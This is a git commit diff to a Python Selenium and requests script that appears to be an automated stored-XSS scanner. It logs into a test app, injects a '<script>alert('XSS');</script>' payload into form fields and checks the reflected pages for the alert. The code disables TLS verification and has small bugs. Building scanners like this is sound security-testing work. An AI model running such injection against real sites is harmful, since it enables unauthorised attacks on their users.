921cbefbfcfb9a96e7f8891813e601bb89533494
rangarajan <vaikunth1991@gmail.com>
2017-04-09 20:08:58 +0800

    Working for App1
    App1 working, need to test for other apps

--- payload_injector/payload_injection.py
+++ payload_injector/payload_injection.py
@@ -4,12 +4,16 @@ from selenium.common.exceptions import TimeoutException
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException, NoAlertPresentException
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import urllib, urllib2, cookielib
 import requests
 from bs4 import BeautifulSoup
 import re
 import time
 from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
+
+blacklist = ("cancel","remove","delete")
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 def check_element_exists(name,driver):
     try:
@@ -25,6 +29,68 @@ def check_submit_exists(driver):
         return False
     return inputElement
 
+def check_for_forms(session,r,root,url):
+    checkForm = True
+    while checkForm:
+        insideForm = False
+        submitForm = False
+        newTarget = None 
+        formMethod = None
+        param = {}
+        #check if need to submit form again to store info in db
+        for line in r.text.splitlines():
+            if "<form" in line.lower():
+                print"found inner form for url " + url + "\n"
+                found = re.match(r".*action\s*=\s*\"\s*([^\s\"]*)\s*\"", line, re.IGNORECASE)
+                if found:
+                    newTarget = found.group(1)
+                    if "http" not in newTarget:
+                        newTarget =  root + newTarget
+                found = re.match(r".*method\s*=\s*\"\s*([^\s\"]*)\s*\"", line, re.IGNORECASE)
+                if found:
+                    formMethod = found.group(1)
+                insideForm = True
+                param.clear()
+            elif "</form" in line.lower():
+                insideForm = False
+            
+            if insideForm:
+                if "input" in line.lower() and "submit" in line.lower():
+                    if any(s in line.lower() for s in blacklist):
+                        newTarget = None
+                        formMethod = None
+                        param.clear()
+                elif "input" in line:
+                    name = ""
+                    value = ""
+                    found = re.match(r".*name\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
+                    if found:
+                        name = found.group(1)
+                    found = re.match(r".*values\s*=\s*\"\s*([^\"]*)\s*\"", line, re.IGNORECASE)
+                    if found:
+                        value = found.group(1)
+                    if not found or not value.strip():
+                        insideForm = False
+                        newTarget = None
+                        formMethod = None
+                        param.clear()
+                    param.update({name:value})
+                elif "textarea" in line:
+                    insideForm = False
+                    newTarget = None
+                    formMethod = None
+                    param.clear()
+        if newTarget and formMethod:
+            print "form check success\n"
+            print "url, data is " + newTarget + "," + param + "\n"
+            if "post" in formMethod.lower():
+                r = session.post(newTarget, data=param, verify=False)
+            elif "get" in formMethod.lower():
+                r = requets.get(url, params=param, verify=False)
+        else:
+            checkForm = False
+                
+                
 #Reading the injection points list from the stored.json file
 
 with open('stored.json') as injection_points_file:
@@ -34,71 +100,74 @@ with open('stored.json') as injection_points_file:
 
 #with open('tmp_xss_payloads.txt') as payloads_file:
 #    payloads = payloads_file.read().splitlines();
-payloads = ["XSS"]
+payloads = ["<script>alert('XSS');</script>"]
 driver = webdriver.Firefox()
+generic_name = "Test"
+attackString = "XSS"
+username = "scanner1"
+password = "scanner1"
 
 #Iterating through injection points, and trying each payload for them
 for tmp in injection_points:
     url = tmp["action"]
-    username = tmp["login"]["username"]
-    password = tmp["login"]["password"]
-    unamefield = "username"
-    passwdfield = "password"
-    btnfield = "login"
-    attackString = "XSS"
+    print "Currently checking the url " + url + "\n"
+    unamefieldtext = "username"
+    passwdfieldtext = "password"
+    login_url = "https://app1.com/users/login.php"
 
     params = tmp["param"]
     method = tmp["method"]
     reflected_pages = tmp["reflected_pages"]
+    urlComponents = url.split("/")
+    root = urlComponents[0] + "//" + urlComponents[2]
 
-    #first do the login so that other pages which require login will pass
-    match = re.search("https\:\/\/(.+)\.com\/",url)
-    site = match.group(1)
-    login_url = "https://"+site+".com/users/login.php"
-    driver.get(login_url)
-    time.sleep(4)
+    #start session by loggin in
+    session = requests.session()
 
-    uname = check_element_exists(unamefield,driver)
-    passwd = check_element_exists(passwdfield,driver)
-    btn = check_submit_exists(driver)
+    login_data = dict()
+    login_data.update({unamefieldtext:username})
+    login_data.update({passwdfieldtext:password})
 
-    if( uname and passwd and btn ):
-        uname.send_keys(username)
-        passwd.send_keys(password)
-        btn.click()
-
+    r = session.post(login_url,data=login_data,verify=False)
+    
     #Iterate through the all the payloads until something works
     for payload in payloads:
-        
+        param_values = dict()
+        for param in params:
+            if "name" in param.lower():
+                param_values[param] = generic_name
+            elif "id" in param.lower():
+                param_values[param] = 13
+            else:
+                param_values[param] = payload
+
+
         #If get add the payload to url params and then execute url/button click
-        if(method == "get"):
-            get_values = "?"
-            for param in params:
-                get_values += param+"="+payload+"&"
-            
-            final_url = url+get_values
-            print "In get, url is "+final_url+ "\n"
-            driver.get(final_url)
-
-        #If post add the payload to UI fields
-        if(method == "post"):
-            driver.get(url)
-            #put the payload in each of the params and add to url_params list        
-            for param in params:
-                paramfield = check_element_exists(param,driver)
-                if(paramfield):
-                    paramfield.send_keys(payload)
-            print "In post\n"
-            btn = check_submit_exists(driver)
-            btn.click()
-
+        if "get" in method.lower():
+            r = requests.get(url, params=param_values, verify=False)
+        
+        if "post" in method.lower():
+            r = session.post(url, data=param_values, verify=False)
+        
+        check_for_forms(session,r,root,url)
         success_flag = 0
         #open reflected page and see if payload has come successfully through PXSS
+        #before opening reflected pages, do a login
+        driver.get(login_url)
+        usernameField = check_element_exists(unamefieldtext,driver)
+        passwordField = check_element_exists(passwdfieldtext,driver)
+        buttonField = check_submit_exists(driver)
+
+        if (usernameField and passwordField and buttonField):
+            usernameField.send_keys(username)
+            passwordField.send_keys(password)
+            buttonField.click()
+
         for page in reflected_pages:
             driver.get(page)
             time.sleep(5)
             try:
-                while EC.alert_is_present():
+                if EC.alert_is_present():
                     alert = driver.switch_to_alert()
                     if attackString in alert.text:
                         print "exploit verified in " + driver.current_url
@@ -106,4 +175,4 @@ for tmp in injection_points:
                     time.sleep(2)
             except NoAlertPresentException:
                 print "Cleared all alerts on page"
-        break
+driver.quit()
